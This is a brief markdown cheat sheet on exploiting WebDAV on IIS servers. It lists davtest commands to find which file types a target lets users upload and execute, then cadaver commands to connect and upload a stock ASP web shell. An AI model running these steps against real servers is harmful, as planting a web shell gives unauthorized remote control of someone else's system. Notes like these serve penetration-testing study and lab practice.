# WebDAV Exploitation

---

WebDAV is a protocol used in IIS Windows http servers which allows files to get
downloaded from this directory and modify and delete files.

A tool for this is davtest, it shows what kind of files we can execute and upload.

davtest -url http://<target_ip>/webdav/

Authorized Access

davtest -auth bob:password -url http://<target_ip>/webdav/

The next step would be to use the cadaver tool, it will help to actually download, delete
edit and upload files into the directory.

cadaver --help shows syntax

cadaver http://<target_ip>/webdav/

ls -la /usr/share/webshells/asp/

--> go to cadaver --> put /usr/share/webshells/asp/webshell.asp
